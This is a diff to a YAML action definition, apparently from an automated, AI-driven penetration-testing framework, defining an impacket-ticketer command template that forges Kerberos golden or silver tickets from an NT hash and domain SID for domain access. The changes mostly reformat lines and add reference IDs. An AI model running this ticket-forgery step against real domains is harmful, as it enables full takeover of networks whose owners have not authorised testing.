@@ -5,8 +5,7 @@ preconditions:
 - domain_joined
 parameters:
   target_ip: from_engagement.target_ip
-command_template: impacket-ticketer -nthash '{nt_hash}' -domain-sid '{domain_sid}'
-  -domain {domain} '{target_user}'
+command_template: impacket-ticketer -nthash '{nt_hash}' -domain-sid '{domain_sid}' -domain {domain} '{target_user}'
 parser: impacket_parser
 expected_effects:
 - action_completed
@@ -14,6 +13,14 @@ falsifier:
   pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: 'Golden ticket: forged TGT using krbtgt hash — full domain access. Silver
-  ticket: forged TGS using service hash — access to specific service.'
+mechanism: "Golden ticket: forged TGT using krbtgt hash \u2014 full domain access. Silver ticket: forged TGS using service\
+  \ hash \u2014 access to specific service."
 hacktricks_ref: windows-hardening/active-directory-methodology/sid-history-injection.md
+references:
+  ocd_mindmap_node_ids:
+  - 1018ad3375
+  - 1b0601fc2a
+  - 8eb839a8b3
+  - 9684291d34
+  - d7e78abb5b
+  - e59ff07eb1
